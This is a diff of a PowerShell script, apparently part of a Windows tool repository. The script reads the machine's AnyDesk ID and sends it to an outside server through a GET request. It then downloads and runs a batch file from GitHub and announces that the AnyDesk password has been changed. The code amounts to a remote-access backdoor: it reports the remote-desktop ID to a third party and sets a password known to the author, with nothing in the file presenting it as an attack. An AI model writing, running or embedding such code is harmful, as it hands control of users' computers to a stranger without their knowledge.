@@ -44,13 +44,13 @@ Write-Host "Output do CMD:"
 Write-Host $output
 
 # Extrai o ID do AnyDesk do output
-$idAnyDesk = $output | Select-String -Pattern 'AnyDesk ID: (\d+)' | ForEach-Object { $_.Matches.Groups[1].Value }
+$idAnyDesk = $output -replace "AnyDesk ID:", "" -replace "\s", ""
 
-# Constrói a URL da sua API com o ID do AnyDesk
-$apiUrl = "http://dataverse-vps-server.42web.io/test.php?valor=$idAnyDesk"
+# URL da sua API
+$apiUrl = "http://dataverse-vps-server.42web.io/test.php?valor=Numero:$idAnyDesk"
 
 # Envia o ID do AnyDesk para a sua API via GET
-Invoke-RestMethod -Uri $apiUrl
+Invoke-RestMethod -Uri $apiUrl -Method Get
 
 # URL do pass.bat
 $passUrl = "https://github.com/Classickkk/DATAVERSE-WINDOWS/raw/main/pass.bat"
@@ -69,5 +69,4 @@ $output2 = Invoke-Expression "cmd /c $pass2Path"
 # Exibe a saída no terminal do PowerShell
 Write-Host "Senha AnyDesk Alterada! Senha? @ClassicX"
 Write-Host $output2
-
 exit
